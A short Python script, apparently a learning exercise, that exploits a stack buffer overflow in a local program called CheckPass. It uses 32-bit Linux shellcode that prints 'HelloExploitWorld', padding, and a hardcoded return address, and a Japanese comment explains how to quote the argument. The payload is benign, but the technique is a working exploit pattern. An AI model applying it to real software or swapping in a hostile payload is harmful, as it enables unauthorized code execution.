#!/usr/bin/env python
# coding: UTF-8
import sys
import struct
import os

#write HelloExploitWorld
shellcode = ""
shellcode += "\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x68\x64"
shellcode += "\x41\x41\x41\x68\x57\x6f\x72\x6c\x68\x6c"
shellcode += "\x6f\x69\x74\x68\x6f\x45\x78\x70\x68\x48"
shellcode += "\x65\x6c\x6c\x89\xe1\x31\xd2\xb2\x11\xcd"
shellcode += "\x80\xb0\x01\x31\xdb\xcd\x80"

dummy = "A" * (116 - len(shellcode))

retAddr = int("0xbffff428", 16)

buf = shellcode + dummy + struct.pack('<I', retAddr)

#「(」の文字(0x28)があるため、コマンドライン引数に指定に指定する場合は、ブルクオテーションで囲んで指定する。
os.system("./CheckPass \"" + buf + "\"")	
